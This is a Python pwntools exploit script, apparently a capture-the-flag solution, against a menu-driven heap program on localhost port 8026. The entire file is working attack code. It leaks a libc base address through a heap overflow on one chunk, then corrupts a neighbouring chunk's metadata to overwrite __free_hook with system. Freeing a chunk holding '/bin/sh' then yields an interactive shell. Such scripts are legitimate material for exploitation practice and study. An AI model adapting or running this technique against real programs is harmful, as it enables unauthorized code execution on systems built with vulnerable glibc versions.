from pwn import *


#r=process("./64",env={"LD_PRELOAD": "./libc-2.24.so"})
# libc=ELF("/lib/x86_64-linux-gnu/libc-2.28.so")
libc=ELF("./libc-2.31.so")

#gdb.attach(r)
#pause()

#r = process("./heap")
r = remote('localhost',8026)

def add(size,content):
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.send(content)
    r.recvuntil("$ ")

def view(index):
    r.sendline("2")
    r.recvuntil("?")
    r.sendline(str(index))
    out = r.recvuntil("1. add")
    r.recvuntil("$ ")
    return out 

def edit(index,content):
    r.sendline("3")
    r.recvuntil("?")
    r.sendline(str(index))
    if content!=None:
        r.recvuntil(">>")
        r.send(content)
    r.recvuntil("$ ")

def free(num):
    r.sendline("4")
    r.recvuntil("?")
    r.sendline(str(num))
    r.recvuntil("$ ")

r.recvuntil("$ ")

# add(1,"A") # 0  
# add(1,"B") # 1
# add(1,"C") # 2
# add(1,"D") # 3
# edit(0,None)
# edit(0,b"A" *24+p64(0x31)+p64(0x0000000100000001)+p64(1)+p64(0xc0c0c0c0c0c0c0c0))


for i in range(0,18):
    if i!=14 and i!=16:
        add(127,chr(ord("A")+i)*8)
    else:
        add(1,chr(ord("A")+i))

for i in range(1,16,2):
    free(i)

# leak from id 14 
edit(14,None)
edit(14,b"O" *80)
leak = view(14)
leak = leak.replace(b"\n1. add",b'')
leak = leak.replace(b"\n"+b"O"*80,b'')
libc_base = u64(leak.ljust(8,b'\x00')) - 2014176
log.info("Libcbase "+hex(libc_base))

free_hook = libc_base+libc.symbols['__free_hook']
system = libc_base+libc.symbols['system']
log.info("free_hook "+hex(free_hook))
log.info("system "+hex(system))

edit(0,b"/bin/sh\x00\x00\x00")
# corrupt 17 from 16 
edit(16,None)
edit(16,b"Z" *24+p64(0x31)+p64(0x0000001100000000)+p64(0x000000000000007f)+p64(0)+p64(free_hook))
edit(17,p64(system))

log.info("shell :) ")
# get shell 
r.sendline("4")
r.recvuntil("?")
r.sendline(str(0))


r.interactive()
